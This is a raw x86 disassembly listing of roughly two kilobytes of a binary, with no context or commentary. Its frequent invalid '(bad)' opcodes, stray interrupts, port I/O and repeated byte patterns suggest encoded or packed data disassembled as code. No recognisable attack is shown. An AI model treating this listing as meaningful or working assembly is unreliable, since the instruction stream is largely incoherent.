  424302:	cmp    ecx,DWORD PTR [edi]
  424304:	cmp    ebx,ecx
  424306:	shr    ebx,cl
  424308:	xchg   edx,eax
  424309:	shr    edx,cl
  42430b:	sub    BYTE PTR [ebx+0x13],dl
  42430e:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  424312:	jbe    0x4242b1
  424314:	popa   
  424315:	and    DWORD PTR [esi-0x777278cb],eax
  42431b:	or     cl,BYTE PTR [ebp-0x32781313]
  424321:	(bad)  
  424322:	in     eax,dx
  424323:	int    0x76
  424325:	dec    esp
  424326:	int    0x1
  424328:	adc    DWORD PTR [ecx+0x718080],eax
  42432e:	xor    ch,cl
  424330:	jbe    0x42437e
  424332:	add    dh,dl
  424334:	in     eax,dx
  424335:	int    0x1
  424337:	adc    DWORD PTR [ecx+0x70008080],eax
  42433d:	dec    esp
  42433e:	leave  
  42433f:	jbe    0x4242e6
  424341:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424348:	dec    edx
  424349:	pop    ss
  42434a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424350:	xchg   esi,eax
  424351:	std    
  424352:	cmp    ecx,DWORD PTR [edi]
  424354:	cmp    ebx,ecx
  424356:	shr    ebx,cl
  424358:	xchg   edx,eax
  424359:	shr    edx,cl
  42435b:	sub    BYTE PTR [ebx+0x13],dl
  42435e:	or     dh,BYTE PTR [esi-0x4b]
  424361:	inc    ebx
  424362:	jge    0x42433a
  424364:	pop    eax
  424365:	int    0x76
  424367:	stc    
  424368:	int    0x8d
  42436a:	stc    
  42436b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42436e:	lock shl edx,cl
  424371:	sub    bl,dl
  424373:	mov    ebp,0xcdd35392
  424378:	lea    esp,[ebp+0x3ba596cd]
  42437e:	fnstcw WORD PTR [ebx]
  424380:	psrlq  mm5,mm2
  424383:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424389:	int    0x1
  42438b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424391:	xchg   edx,eax
  424392:	push   ebx
  424393:	jecxz  0x4243c4
  424395:	rcl    ebp,1
  424397:	bound  eax,QWORD PTR [eax]
  424399:	jo     0x4243cf
  42439b:	int    0x76
  42439d:	std    
  42439e:	int    0x8d
  4243a0:	std    
  4243a1:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243a4:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243ab:	push   ebx
  4243ac:	rol    DWORD PTR [ebx+0x76],cl
  4243af:	mov    ch,0xd6
  4243b1:	and    ch,cl
  4243b3:	jbe    0x424352
  4243b5:	int    0x8d
  4243b7:	popf   
  4243b8:	cmp    esi,eax
  4243ba:	cmp    edi,DWORD PTR [ecx-0x2d]
  4243bd:	mov    ebp,0x28f2d392
  4243c2:	push   ebx
  4243c3:	jge    0x424408
  4243c5:	fld    TBYTE PTR [edi]
  4243c7:	pop    es
  4243c8:	xchg   esp,eax
  4243c9:	add    BYTE PTR [eax],al
  4243cb:	add    ch,cl
  4243cd:	jbe    0x4243cc
  4243cf:	int    0x8d
  4243d1:	std    
  4243d2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243d5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243dc:	push   ebx
  4243dd:	rol    DWORD PTR [ebx+0x76],cl
  4243e0:	mov    ch,0xd6
  4243e2:	and    ch,cl
  4243e4:	jbe    0x4243df
  4243e6:	int    0x8d
  4243e8:	stc    
  4243e9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243ec:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243f3:	push   ebx
  4243f4:	rol    DWORD PTR [ecx-0x5f14428a],cl
  4243fa:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  424404:	leave  
  424405:	jbe    0x4243fc
  424407:	fdivr  st,st(4)
  424409:	sbb    al,0xb
  42440b:	int    0xa6
  42440d:	std    
  42440e:	int    0x76
  424410:	std    
  424411:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  424417:	xchg   edx,eax
  424418:	shr    DWORD PTR [ebp-0x1462acd8],cl
  42441e:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  424424:	std    
  424425:	int    0x8d
  424427:	std    
  424428:	cmp    edi,DWORD PTR [ecx+0x3b]
  42442b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424432:	push   ebx
  424433:	ror    DWORD PTR [edx],cl
  424435:	jbe    0x424424
  424437:	int    0x76
  424439:	std    
  42443a:	int    0x8d
  42443c:	std    
  42443d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424440:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424447:	push   ebx
  424448:	ror    DWORD PTR [edx],cl
  42444a:	jbe    0x424441
  42444c:	int    0x8d
  42444e:	std    
  42444f:	int    0x76
  424451:	std    
  424452:	cmp    ecx,DWORD PTR [edi]
  424454:	cmp    ecx,ecx
  424456:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42445c:	push   ebx
  42445d:	jge    0x42442c
  42445f:	jbe    0x4243f6
  424461:	inc    ebx
  424462:	jge    0x424438
  424464:	xchg   ch,cl
  424466:	test   BYTE PTR ds:0xcded760a,bl
  42446c:	jbe    0x42441b
  42446e:	int    0x84
  424470:	sbb    eax,0xcdf5760a
  424475:	jbe    0x424474
  424477:	int    0x8d
  424479:	std    
  42447a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42447d:	lock shl edx,cl
  424480:	sub    bl,dl
  424482:	mov    ebp,0xcdd35392
  424487:	(bad)  
  424488:	in     eax,dx
  424489:	inc    ebx
  42448a:	rcl    esp,cl
  42448c:	push   esp
  42448d:	int    0x76
  42448f:	std    
  424490:	int    0x8d
  424492:	std    
  424493:	cmp    esi,eax
  424495:	cmp    edi,DWORD PTR [ecx-0x2d]
  424498:	repnz sub bl,dl
  42449b:	mov    ebp,0xcdd35392
  4244a0:	(bad)  
  4244a1:	in     eax,dx
  4244a2:	shr    ebx,cl
  4244a4:	sub    al,BYTE PTR [ebx-0x2d]
  4244a7:	aam    0x1c
  4244a9:	int    0x8d
  4244ab:	in     eax,dx
  4244ac:	int    0x76
  4244ae:	dec    esp
  4244af:	int    0x1
  4244b1:	adc    DWORD PTR [ecx-0x44d07f80],eax
  4244b7:	retf   
  4244b8:	jno    0x4244ba
  4244ba:	(bad)  
  4244bb:	mov    ch,0x0
  4244bd:	jo     0x424447
  4244bf:	in     al,dx
  4244c0:	push   ds
  4244c1:	int    0x76
  4244c3:	cmc    
  4244c4:	xchg   DWORD PTR [esi-0x78],esi
  4244c7:	int    0x8d
  4244c9:	dec    esp
  4244ca:	int    0xa
  4244cc:	adc    DWORD PTR [ecx+0x6d048080],eax
  4244d2:	xchg   edx,eax
  4244d3:	jo     0x4244d5
  4244d5:	(bad)  
  4244d6:	mov    ch,0x0
  4244d8:	jno    0x424462
  4244da:	or     dh,BYTE PTR [esi-0xb]
  4244dd:	int    0x76
  4244df:	std    
  4244e0:	int    0x8d
  4244e2:	std    
  4244e3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244e6:	lock shl edx,cl
  4244e9:	sub    bl,dl
  4244eb:	mov    ebp,0xcdd35392
  4244f0:	(bad)  
  4244f1:	cmc    
  4244f2:	inc    ebx
  4244f3:	ror    ebp,cl
  4244f5:	jbe    0x4244f0
  4244f7:	int    0x8d
  4244f9:	stc    
  4244fa:	(bad)  
  4244fb:	xor    DWORD PTR [ebx],edi
  4244fd:	jns    0x42453a
  4244ff:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424506:	push   ebx
  424507:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  42450d:	cmp    esi,eax
  42450f:	cmp    edi,DWORD PTR [ecx-0x2d]
  424512:	repnz sub bl,dl
  424515:	mov    ebp,0xcdd35392
  42451a:	(bad)  
  42451b:	cmc    
  42451c:	das    
  42451d:	rcl    ebx,1
  42451f:	int    0x8d
  424521:	lods   eax,DWORD PTR ds:[esi]
  424522:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  424529:	(bad)  
  42452a:	stc    
  42452b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42452e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424535:	push   ebx
  424536:	rol    DWORD PTR [edi-0x2893263],cl
  42453c:	int    0x8d
  42453e:	std    
  42453f:	cmp    esi,eax
  424541:	cmp    edi,DWORD PTR [ecx-0x2d]
  424544:	repnz sub bl,dl
  424547:	mov    ebp,0xcdd35392
  42454c:	lea    ebp,[ebp+0x2f1f845e]
  424552:	push   es
  424553:	or     al,0xff
  424555:	add    BYTE PTR [eax],al
  424557:	int    0x76
  424559:	adc    ebp,ecx
  42455b:	lea    edx,[ecx]
  42455d:	ins    BYTE PTR es:[edi],dx
  42455e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424564:	test   BYTE PTR [eax-0x2cac7f80],al
  42456a:	int    0x8d
  42456c:	icebp  
  42456d:	push   esi
  42456e:	dec    ecx
  42456f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424575:	add    BYTE PTR [eax],al
  424577:	int    0x76
  424579:	std    
  42457a:	int    0x8d
  42457c:	std    
  42457d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424580:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424587:	push   ebx
  424588:	rcr    DWORD PTR [esi+0x76],cl
  42458b:	mov    ebp,0x76cd88d6
  424590:	stc    
  424591:	int    0x8d
  424593:	stc    
  424594:	in     al,dx
  424595:	xchg   ch,cl
  424597:	jbe    0x424596
  424599:	int    0x8d
  42459b:	std    
  42459c:	cmp    esi,eax
  42459e:	cmp    edi,DWORD PTR [ecx-0x56]
  4245a1:	shl    edx,cl
  4245a3:	sub    bl,dl
  4245a5:	mov    ebp,0xd353a892
  4245aa:	arpl   bx,cx
  4245ac:	ror    BYTE PTR [eax-0x12326980],cl
  4245b2:	add    al,0xed
  4245b4:	xor    al,0xc9
  4245b6:	jbe    0x4245b5
  4245b8:	dec    ecx
  4245b9:	and    DWORD PTR [esi-0x528936cb],eax
  4245bf:	inc    ecx
  4245c0:	and    DWORD PTR [esi+0x4c76cd35],eax
  4245c6:	or     dh,BYTE PTR [esi+0x4c]
  4245c9:	cwde   
  4245ca:	int    0x6d
  4245cc:	int    0x76
  4245ce:	std    
  4245cf:	int    0x96
  4245d1:	std    
  4245d2:	sar    bh,0x5f
  4245d5:	shl    DWORD PTR [ecx],1
  4245d7:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  4245dd:	cdq    
  4245de:	shr    edx,cl
  4245e0:	sub    bl,dl
  4245e2:	mov    ebp,0xcdd25392
  4245e7:	xchg   esi,eax
  4245e8:	mov    BYTE PTR [ebx-0xf],al
  4245eb:	das    
  4245ec:	add    eax,0x80808159
  4245f1:	int    0x76
  4245f3:	mov    ch,cl
  4245f5:	xchg   esi,eax
  4245f6:	mov    BYTE PTR [edi+0xa9a6470],al
  4245fc:	xchg   esi,eax
  4245fd:	cmc    
  4245fe:	leave  
  4245ff:	jbe    0x4245fa
  424601:	popa   
  424602:	and    DWORD PTR [esi-0x68932cb],eax
  424608:	int    0x96
  42460a:	stc    
  42460b:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  424611:	rcl    ebx,cl
  424613:	mov    ebp,0xcdd25392
  424618:	xchg   esi,eax
  424619:	std    
  42461a:	int    0xe6
  42461c:	std    
  42461d:	cmp    esp,ebx
  42461f:	cmp    edi,edi
  424621:	shr    ecx,cl
  424623:	sub    bl,dl
  424625:	repz xchg edx,eax
  424627:	push   ebx
  424628:	fxch   st(5)
  42462a:	out    0xf5,al
  42462c:	pop    esi
  42462d:	xchg   esp,eax
  42462e:	leave  
  42462f:	fsubr  QWORD PTR [edi]
  424631:	add    eax,0x8080816b
  424636:	int    0x96
  424638:	cmc    
  424639:	int    0x76
  42463b:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424641:	or     ch,0x96
  424644:	mov    ch,cl
  424646:	out    0xf5,al
  424648:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42464e:	pop    ebx
  42464f:	int    0xa6
  424651:	std    
  424652:	cmp    edi,edx
  424654:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42465a:	in     eax,0x28
  42465c:	push   ebx
  42465d:	cld    
  42465e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424664:	add    eax,0x8080814f
  424669:	int    0x96
  42466b:	std    
  42466c:	int    0xe6
  42466e:	std    
  42466f:	cmp    esp,ebx
  424671:	cmp    edi,edi
  424673:	shl    ebx,cl
  424675:	xchg   edx,eax
  424676:	shr    ecx,cl
  424678:	sub    BYTE PTR [ebx-0x27],dl
  42467b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424681:	mov    dl,0x21
  424683:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424689:	out    0xfd,al
  42468b:	cmp    esp,ebx
  42468d:	cmp    edi,edi
  42468f:	shl    ebx,cl
  424691:	xchg   edx,eax
  424692:	shr    ecx,cl
  424694:	sub    BYTE PTR [ebx-0x27],dl
  424697:	jmp    0x42469b
  424699:	add    BYTE PTR [eax-0x2693280],0xcd
  4246a0:	(bad)  
  4246a1:	std    
  4246a2:	add    al,0xf7
  4246a4:	(bad)  
  4246a5:	cmp    esp,ebx
  4246a7:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  4246ad:	push   ebx
  4246ae:	cdq    
  4246af:	iret   
  4246b0:	ja     0x4246ab
  4246b2:	jecxz  0x4246a3
  4246b4:	inc    ebx
  4246b5:	cdq    
  4246b6:	das    
  4246b7:	add    al,0x21
  4246b9:	add    BYTE PTR [eax-0x3004cc80],0xe4
  4246c0:	jo     0x42464a
  4246c2:	or     dl,dh
  4246c4:	mov    ch,0x2f
  4246c6:	mov    ebx,0xea121a
  4246cb:	das    
  4246cc:	add    BYTE PTR [eax-0x321269f6],0x96
  4246d3:	in     eax,dx
  4246d4:	xchg   DWORD PTR [eax],esi
  4246d6:	int    0xd6
  4246d8:	in     eax,dx
  4246d9:	xchg   DWORD PTR [eax-0x2d],edx
  4246dc:	repz sub bl,dl
  4246df:	mov    ecx,0x2ffb5392
  4246e4:	mov    ebx,0x4cf3d31a
  4246e9:	adc    dh,bh
  4246eb:	dec    ecx
  4246ec:	and    DWORD PTR [esi-0x1229f5cb],eax
  4246f2:	or     dl,BYTE PTR [esi-0x12693243]
  4246f8:	int    0xd6
  4246fa:	in     eax,dx
  4246fb:	cmp    esp,ebx
  4246fd:	add    al,0xf7
  4246ff:	call   ebx
  424701:	repz xchg edx,eax
  424703:	sar    DWORD PTR [ecx-0x7866acd8],cl
  424709:	xchg   esi,eax
  42470a:	mov    BYTE PTR [edx],cl
  42470c:	xchg   esi,eax
  42470d:	in     eax,dx
  42470e:	int    0x96
  424710:	dec    esp
  424711:	int    0xd6
  424713:	dec    esp
  424714:	cmp    esp,ebx
  424716:	add    al,0xf7
  424718:	call   ebx
  42471a:	mov    ecx,0x92f3d328
  42471f:	push   ebx
  424720:	cdq    
  424721:	int    0xd6
  424723:	mov    ebp,0x32d6fb43
  424728:	int    0x96
  42472a:	dec    esp
  42472b:	int    0xd6
  42472d:	dec    esp
  42472e:	cmp    esp,ebx
  424730:	add    al,0xf7
  424732:	call   ebx
  424734:	mov    ecx,0x92f3d328
  424739:	push   ebx
  42473a:	cdq    
  42473b:	int    0xd6
  42473d:	mov    ebp,0x88d6fb43
  424742:	int    0x96
  424744:	in     eax,dx
  424745:	int    0xd6
  424747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424748:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42474f:	mov    ch,0x2f
  424751:	push   es
  424752:	xchg   ebx,eax
  424753:	add    BYTE PTR [eax],al
  424755:	add    BYTE PTR [ecx-0x6932ee5a],al
  42475b:	stc    
  42475c:	int    0xd6
  42475e:	stc    
  42475f:	cmp    esp,ebx
  424761:	add    al,0xf7
  424763:	call   ebx
  424765:	mov    ecx,0x92f3d328
  42476a:	push   ebx
  42476b:	cdq    
  42476c:	int    0xd6
  42476e:	adc    ebp,ecx
  424770:	out    0xf5,al
  424772:	inc    ebx
  424773:	aam    0xd9
  424775:	in     al,0x77
  424777:	sub    al,0xcd
  424779:	xchg   esi,eax
  42477a:	std    
  42477b:	int    0xd6
  42477d:	std    
  42477e:	cmp    esp,ebx
  424780:	add    al,0xf7
  424782:	call   ebx
  424784:	repz xchg edx,eax
  424786:	sar    DWORD PTR [ecx+0x53c58728],cl
  42478c:	cdq    
  42478d:	int    0x9c
  42478f:	test   BYTE PTR [ebx-0x1e],al
  424792:	das    
  424793:	push   es
  424794:	test   BYTE PTR [eax],al
  424796:	add    BYTE PTR [eax],al
  424798:	arpl   bp,cx
  42479a:	jbe    0x424749
  42479c:	cmp    edx,ebx
  42479e:	int    0x8d
  4247a0:	lods   eax,DWORD PTR ds:[esi]
  4247a1:	add    al,0x2
  4247a3:	jmp    FWORD PTR [edx+0x76cd4aec]
  4247a9:	std    
  4247aa:	cmp    edx,ebx
  4247ac:	int    0x8d
  4247ae:	std    
  4247af:	cmp    ecx,DWORD PTR [edi]
  4247b1:	shl    edx,cl
  4247b3:	sub    bl,dl
  4247b5:	mov    ebp,0xa8d35392
  4247ba:	retf   
  4247bb:	ror    BYTE PTR [eax-0x12326980],cl
  4247c1:	adc    ch,ch
  4247c3:	xchg   ebp,eax
  4247c4:	add    BYTE PTR [eax-0x2893680],0x49
  4247cb:	and    DWORD PTR [esi-0x68936cb],eax
  4247d1:	inc    ecx
  4247d2:	and    DWORD PTR [esi-0x28932cb],eax
  4247d8:	int    0x8d
  4247da:	std    
  4247db:	cwde   
  4247dc:	call   0x8621:0xd169ffc0
  4247e3:	xor    eax,0xbdd3793b
  4247e8:	xchg   edx,eax
  4247e9:	mov    al,ds:0xf2d3133b
  4247ee:	sub    BYTE PTR [ebx-0x2d],dl
  4247f1:	or     dh,BYTE PTR [esi-0x53]
  4247f4:	int    0x76
  4247f6:	std    
  4247f7:	int    0x8d
  4247f9:	std    
  4247fa:	cmp    edi,DWORD PTR [ecx-0x2d]
  4247fd:	mov    ebp,0xd3133b92
  424802:	repnz sub BYTE PTR [ebx-0x2d],dl
  424806:	or     dh,BYTE PTR [esi-0xf]
  424809:	int    0xe6
  42480b:	and    al,0xcd
  42480d:	jbe    0x4247fc
  42480f:	int    0x8d
  424811:	in     eax,dx
  424812:	cmp    edx,ebx
  424814:	or     dh,BYTE PTR [esi-0x13]
  424817:	adc    dh,BYTE PTR [esi-0x13]
  42481a:	dec    ecx
  42481b:	mov    al,ds:0x76cd3586
  424820:	cmc    
  424821:	int    0x8d
  424823:	cmc    
  424824:	cmp    edx,ebx
  424826:	or     dh,BYTE PTR [esi-0xb]
  424829:	adc    dh,BYTE PTR [esi-0xb]
  42482c:	dec    ecx
  42482d:	lahf   
  42482e:	xchg   BYTE PTR ds:0xcd1176cd,dh
  424834:	lea    edx,[ecx]
  424836:	cmp    edx,ebx
  424838:	or     dh,BYTE PTR [esi+0x11]
  42483b:	adc    dh,BYTE PTR [esi+0x11]
  42483e:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424844:	mov    ch,0xcd
  424846:	lea    esi,[ebp+0x760ad33b]
  42484c:	mov    ch,0x12
  42484e:	jbe    0x424805
  424850:	dec    ecx
  424851:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424858:	hlt    
  424859:	mov    esi,DWORD PTR ds:0x68876cd
  42485f:	ins    DWORD PTR es:[edi],dx
  424860:	das    
  424861:	add    eax,0x80808551
  424866:	int    0x76
  424868:	dec    esp
  424869:	push   es
  42486a:	ins    DWORD PTR es:[edi],dx
  42486b:	das    
  42486c:	add    eax,0x80808538
  424871:	int    0x76
  424873:	sbb    al,0x6
  424875:	ins    DWORD PTR es:[edi],dx
  424876:	das    
  424877:	add    eax,0x80808523
  42487c:	int    0x76
  42487e:	and    al,0xcd
  424880:	jbe    0x4248a6
  424882:	int    0x8d
  424884:	mov    bl,dl
  424886:	mov    ebp,0x39af5692
  42488b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424892:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42489c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42489f:	mov    ebp,0xd3133b92
  4248a4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4248a8:	or     dh,BYTE PTR [esi-0xf]
  4248ab:	int    0x76
  4248ad:	std    
  4248ae:	int    0x76
  4248b0:	std    
  4248b1:	int    0x76
  4248b3:	mov    ch,cl
  4248b5:	lea    ecx,[eax-0x329b8379]
  4248bb:	outs   dx,BYTE PTR ds:[esi]
  4248bc:	jo     0x4248c8
  4248be:	lea    esp,[esi+eax*1]
  4248c1:	ins    DWORD PTR es:[edi],dx
  4248c2:	das    
  4248c3:	add    eax,0x808084f0
  4248c8:	leave  
  4248c9:	jbe    0x424860
  4248cb:	dec    ecx
  4248cc:	and    DWORD PTR [eax+0x35],edi
  4248cf:	int    0x76
  4248d1:	xchg   ebp,eax
  4248d2:	pop    ebx
  4248d3:	int    0xa6
  4248d5:	xchg   ebp,eax
  4248d6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4248d9:	loop   0x4248ae
  4248db:	mov    ebp,0x28e5d392
  4248e0:	push   ebx
  4248e1:	popf   
  4248e2:	or     ah,BYTE PTR [esi-0x289326b]
  4248e8:	int    0x76
  4248ea:	std    
  4248eb:	int    0x8
  4248ed:	sub    eax,0xcd808081
  4248f2:	xor    ch,cl
  4248f4:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  4248f8:	int    0x76
  4248fa:	std    
  4248fb:	int    0x76
  4248fd:	std    
  4248fe:	int    0x8
  424900:	and    eax,0xcd808081
  424905:	sbb    al,0xa
  424907:	xchg   esi,eax
  424908:	dec    esp
  424909:	inc    ebx
  42490a:	fst    st(6)
  42490c:	push   0xffffffcd
  42490e:	(bad)  
  42490f:	cmc    
  424910:	int    0x8
  424912:	adc    DWORD PTR [ecx-0x69307f80],eax
  424918:	lods   eax,DWORD PTR ds:[esi]
  424919:	(bad)  
  42491a:	int    0x96
  42491c:	cmc    
  42491d:	cmp    ecx,DWORD PTR [edi]
  42491f:	add    al,0xfb
  424921:	call   ebx
  424923:	jmp    0x4248b7
  424925:	shr    edx,cl
  424927:	sub    BYTE PTR [ebx-0x1d],dl
  42492a:	int    0x8d
  42492c:	dec    esp
  42492d:	bound  eax,QWORD PTR [eax]
  42492f:	xchg   ecx,eax
  424930:	jo     0x42498d
  424932:	add    BYTE PTR [eax+0x24],dh
  424935:	int    0x8d
  424937:	dec    esp
  424938:	int    0x6e
  42493a:	xchg   esp,eax
  42493b:	int    0x7e
  42493d:	jo     0x424972
  42493f:	jge    0x4249b2
  424941:	xchg   ebp,eax
  424943:	jo     0x424902
  424945:	dec    esi
  424946:	xchg   BYTE PTR [eax+0x248dcd80],al
  42494c:	int    0x8
  42494e:	xor    eax,0xa808081
  424953:	sbb    al,0x0
  424955:	xchg   ecx,eax
  424956:	xchg   esp,eax
  424957:	add    dh,dl
  424959:	mov    BYTE PTR [ebx-0x43],bl
  42495c:	or     eax,0xcd808084
  424961:	pop    ebx
  424962:	fs xchg ebp,edx
  424965:	das    
  424966:	mov    ebx,0x74cf1452
  42496b:	xor    BYTE PTR [edx+ecx*1],bl
  42496e:	jbe    0x42498c
  424970:	int    0x76
  424972:	std    
  424973:	int    0x8d
  424975:	std    
  424976:	cmp    edi,DWORD PTR [ecx+0x4]
  424979:	add    bh,bh
  42497b:	shl    edx,cl
  42497d:	sub    bl,dl
  42497f:	mov    ebp,0x2fd35392
  424984:	mov    ebx,0x960a868a
  424989:	and    al,0x43
  42498b:	jge    0x4249bc
  42498d:	add    eax,0x808080e9
  424992:	int    0x76
  424994:	std    
  424995:	int    0x8d
  424997:	std    
  424998:	cmp    edi,DWORD PTR [ecx+0x4]
  42499b:	add    bh,bh
  42499d:	shl    edx,cl
  42499f:	sub    bl,dl
  4249a1:	mov    ebp,0xad35392
  4249a6:	jbe    0x42494d
  4249a8:	int    0x76
  4249aa:	stc    
  4249ab:	int    0x8d
  4249ad:	stc    
  4249ae:	add    al,0x2
  4249b0:	(bad)  
  4249b1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4249b4:	repnz sub bl,dl
  4249b7:	mov    ebp,0x2fd35392
  4249bc:	mov    ebx,0x7d33868a
  4249c1:	pop    esi
  4249c2:	lea    esp,[ebp-0x7f2ef7d1]
  4249c8:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  4249cf:	mov    BYTE PTR [edx],cl
  4249d1:	lea    ebx,[esp+ebp*8]
  4249d4:	xchg   ebp,ecx
  4249d6:	lea    ebx,[ecx*8+0x31cd5c52]
  4249dd:	or     dh,BYTE PTR [esi-0x63]
  4249e0:	jl     0x4249e8
  4249e2:	icebp  
  4249e3:	aam    0x89
  4249e5:	clc    
  4249e6:	icebp  
  4249e7:	sub    edx,edx
  4249e9:	xchg   DWORD PTR [esi-0x63],esi
  4249ec:	in     al,dx
  4249ed:	xchg   edx,eax
  4249ee:	int    0xd2
  4249f0:	jo     0x4249bf
  4249f2:	outs   dx,BYTE PTR ds:[esi]
  4249f3:	test   BYTE PTR [edi+0x63bd70c5],al
  4249f9:	test   DWORD PTR [eax+0x1c76cd80],eax
  4249ff:	int    0x7c
  424a01:	mov    BYTE PTR [edx],cl
  424a03:	lea    ebx,[ebp-0x32027233]
  424a09:	xchg   esi,eax
  424a0a:	std    
  424a0b:	cmp    ecx,DWORD PTR [edi]
  424a0d:	add    al,0xfb
  424a0f:	call   ebx
  424a11:	jmp    0x4249a5
  424a13:	shr    edx,cl
  424a15:	sub    BYTE PTR [ebx+0x13],dl
  424a18:	pop    esi
  424a19:	lea    ebx,[ebp-0x7232e32c]
  424a1f:	mov    BYTE PTR [edi-0x29ffb384],al
  424a25:	popf   
  424a26:	int    0x6c
  424a28:	test   BYTE PTR [ecx-0x79],dh
  424a2b:	lds    esi,FWORD PTR [eax-0x43]
  424a2e:	add    eax,DWORD PTR [edi+0x76cd8080]
  424a34:	sbb    al,0xcd
  424a36:	(bad)  
  424a37:	stc    
  424a38:	int    0x96
  424a3a:	stc    
  424a3b:	cmp    ecx,DWORD PTR [edi]
  424a3d:	shr    ebx,cl
  424a3f:	xchg   edx,eax
  424a40:	add    al,0xfb
  424a42:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a49:	push   ebx
  424a4a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a50:	and    al,0xa
  424a52:	jbe    0x424a70
  424a54:	int    0x76
  424a56:	stc    
  424a57:	int    0x8d
  424a59:	stc    
  424a5a:	add    al,0x2
  424a5c:	(bad)  
  424a5d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a60:	repnz sub bl,dl
  424a63:	mov    ebp,0xcdd35392
  424a68:	lea    esp,[edi+ebp*1]
  424a6b:	mov    ebx,0x7d33867e
  424a70:	pop    esi
  424a71:	lea    esp,[ebp+0xa4072f]
  424a77:	add    BYTE PTR [eax],al
  424a79:	int    0x8
  424a7b:	and    eax,0x43808081
  424a80:	sbb    al,0xd6
  424a82:	cmp    ecx,ebp
  424a84:	lea    edx,[ecx]
  424a86:	int    0x8
  424a88:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a8e:	lods   eax,DWORD PTR ds:[esi]
  424a8f:	(bad)  
  424a90:	int    0x96
  424a92:	adc    DWORD PTR [ebx],edi
  424a94:	(bad)  
  424a96:	sti    
  424a97:	call   ebx
  424a99:	jmp    0x424a2d
  424a9b:	shr    edx,cl
  424a9d:	sub    BYTE PTR [ebx-0x1d],dl
  424aa0:	int    0x8d
  424aa2:	dec    esp
  424aa3:	bound  eax,QWORD PTR [eax]
  424aa5:	xchg   ecx,eax
  424aa6:	xchg   esp,eax
  424aa7:	pop    ebx
  424aa8:	add    BYTE PTR [eax+0x24],dh
  424aab:	push   es
  424aac:	ins    DWORD PTR es:[edi],dx
  424aad:	das    
  424aae:	add    eax,0x808092d9
  424ab3:	int    0x96
  424ab5:	and    al,0xcd
  424ab7:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424abd:	or     ch,0x7d
  424ac0:	cmp    ecx,DWORD PTR [edi]
  424ac2:	add    al,0x11
  424ac4:	call   ebx
  424ac6:	jmp    0x424a5a
  424ac8:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424ace:	add    eax,0x808081da
  424ad3:	int    0x76
  424ad5:	std    
  424ad6:	int    0x8d
  424ad8:	std    
  424ad9:	cmp    edi,DWORD PTR [ecx+0x4]
  424adc:	add    bh,bh
  424ade:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424ae4:	push   ebx
  424ae5:	ror    DWORD PTR [edx],cl
  424ae7:	jbe    0x424aa6
  424ae9:	pop    ebp
  424aea:	push   0xcf35869f
  424aef:	jl     0x424a9e
  424af1:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424af7:	leave  
  424af8:	jbe    0x424b3f
  424afa:	sbb    BYTE PTR [edi+0x76c93586],bl
  424b00:	shr    al,1
  424b02:	lahf   
  424b03:	xchg   BYTE PTR ds:0xc955760a,dh
  424b09:	jbe    0x424b78
  424b0b:	dec    ecx
  424b0c:	and    DWORD PTR [esi-0x3234c4cb],eax
  424b12:	xchg   esp,eax
  424b13:	iret   
  424b14:	inc    ebp
  424b15:	shl    ebx,cl
  424b17:	xchg   edx,eax
  424b18:	adc    bh,bl
  424b1a:	scas   eax,DWORD PTR es:[edi]
  424b1b:	cmp    DWORD PTR [eax+0x150ab880],eax
  424b21:	lea    esi,[eax+eax*1+0x0]
  424b25:	add    BYTE PTR [esi+0x4],ch
  424b28:	cli    
